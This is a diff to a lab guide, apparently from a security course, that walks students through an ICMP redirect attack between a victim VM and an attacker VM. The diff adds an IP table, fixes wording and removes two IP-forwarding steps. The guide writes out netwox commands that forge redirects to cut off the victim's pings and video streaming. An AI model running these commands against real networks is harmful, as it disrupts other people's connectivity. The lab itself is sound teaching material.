@@ -8,6 +8,11 @@ In this lab, you will disrupt a victim machine's ICMP traffic using the ICMP red
 
 2 Linux VMs. VM1 as the victim; VM2 as the attacker. The 2 VMs do not need to be in the same network - however, this lab has only been tested when the two VMs are in the same network.
 
+| VM  |  IP Address   |
+|-----|---------------|
+| VM1 | 172.16.77.128 |
+| VM2 | 172.16.77.129 |
+
 ### Preparation steps:
 
 This attack only requires one netwox command, let's prepare the command first. This command is: sudo netwox 86 --device "ens33" --filter "src host victim_ip_address" --gw "attacker_ip_address" --src-ip "trusted_gateway_ip_address" --code 1
@@ -43,7 +48,7 @@ question: can you find out what "--code 1" means?
 $ ping www.google.com
 ```
 
-make sure you ping command works and you do get response from google, otherwise this lab makes no sense. if ping works, press ctrl-c to stop the ping command and move on to step 2.
+make sure your ping command works and you do get responses from google, otherwise this lab makes no sense. if ping works, press ctrl-c to stop the ping command and move on to step 2.
 
 2. attacker, run that attack command: 
 
@@ -65,23 +70,11 @@ $ ping www.google.com (this time it should still succeed)
 $ ping www.google.com (this time it should fail, thus it proves the attack is successful.)
 ```
 
-6: attacker, run: 
-
-```console
-$ sudo sysctl net.ipv4.ip_forward=1 (immediately the victim's ping will then succeed, explain why?)
-```
-
-7: attacker, run: 
-
-```console
-$ sudo sysctl net.ipv4.ip_forward=0 (turning this off so our attack will succeed.)
-```
-
 the next two steps attempt a new attack which disrupts the victim's video streaming service:
 
-8: victim, open firefox, watch some youtube video.
+6: victim, open firefox, watch some youtube video.
 
-9: attacker, run the exact same attack command as before: 
+7: attacker, run the exact same attack command as before: 
 
 ```console
 $ sudo netwox 86 --device "ens33" --filter "src host 172.16.77.128" --gw "172.16.77.129" --src-ip "172.16.77.2" --code 1 (if successful, victim won't be able to watch the youtude video)
